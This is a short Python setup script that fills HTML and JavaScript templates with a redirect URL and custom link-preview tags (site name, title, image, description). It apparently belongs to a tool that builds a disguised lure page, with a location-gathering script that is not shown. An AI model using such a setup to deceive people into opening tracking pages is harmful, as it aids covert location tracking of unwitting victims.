#!/usr/bin/env python3


R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

old = input(G + '[+]' + C + ' Do you want to reuse previous configs? (Y/N) : ' + W)

if old.lower() != 'y':
    redirect = input(G + '[+]' + C + ' Enter Target URL (YouTube,Blog etc) : ' + W)
    sitename = input(G + '[+]' + C + ' Site Name: ' + W)
    title = input(G + '[+]' + C + ' Title : ' + W)
    image_url = input(G + '[+]' + C + ' Image URL: ' + W)
    description = input(G + '[+]' + C + ' Description: ' + W)

    with open('template/custom_og_tags/js/location_temp.js', 'r') as js:
    	reader = js.read()
    	update = reader.replace('REDIRECT_URL', redirect)

    with open('template/custom_og_tags/js/location.js', 'w') as js_update:
    	js_update.write(update)

    with open('template/custom_og_tags/index_temp.html', 'r') as index_temp:
        code = index_temp.read()
        code = code.replace('$SITE_NAME$', sitename)
        code = code.replace('$TITLE$', title)
        code = code.replace('$IMG_URL$', image_url)
        code = code.replace('$DESCRIPTION$', description)

    with open('template/custom_og_tags/index.html', 'w') as new_index:
        new_index.write(code)
